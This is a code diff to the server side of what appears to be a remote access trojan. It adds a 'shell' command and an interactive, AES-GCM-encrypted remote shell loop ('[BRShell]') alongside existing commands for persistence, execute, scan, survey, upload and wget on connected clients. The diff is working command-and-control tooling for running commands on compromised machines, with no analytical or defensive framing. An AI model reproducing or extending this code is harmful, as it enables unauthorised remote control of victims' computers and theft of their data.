@@ -48,7 +48,7 @@ upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
              'persistence', 'quit', 'rekey', 'scan', 'survey', 'unzip',
-             'upload', 'wget' ]
+             'upload', 'wget', "shell" ]
 
 
 class Server(threading.Thread):
@@ -95,18 +95,16 @@ class Server(threading.Thread):
         self.clients.remove(conn_to_remove)
 
 
-class ClientConnection(threading.Thread):
+class ClientConnection():
     alive = True
     
     def __init__(self, conn, addr):
-        super(ClientConnection, self).__init__()
         self.conn   = conn
         self.addr   = addr
         self.dh_key = crypto.diffiehellman(self.conn, server=True)
         self.GCM    = crypto.AES_GCM(self.dh_key)
         self.IV     = 0
         self.conn.setblocking(0)
-        self.start()
     
     def send(self, prompt, cmd, action):
         if not self.alive:
@@ -139,6 +137,9 @@ class ClientConnection(threading.Thread):
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
+        elif cmd == 'shell':
+            self.shell()
+
         # results of survey, persistence, unzip, or wget
         elif cmd in ['execute', 'scan', 'survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
@@ -146,6 +147,25 @@ class ClientConnection(threading.Thread):
             print recv_data
             #recv_data = self.conn.recv(1024)
             #print crypto.AES_decrypt(recv_data, self.dh_key)
+
+    def shell(self):
+        while True:
+            recv_data = crypto.recvGCM(self.conn, self.GCM).rstrip()
+
+            # Get current directory
+            cwd = recv_data.split("|")[0]
+
+            # Get all other data
+            if recv_data.split("|")[1] not in "":
+                print(recv_data.split("|")[1])
+
+            prompt = raw_input('\n[BRShell]{}> '.format(cwd)).rstrip()
+            crypto.sendGCM(self.conn, self.GCM, self.IV, prompt)
+            self.conn.settimeout(1)
+            self.IV += 1
+
+            if prompt == "exit":
+                break
 
 
 def get_parser():
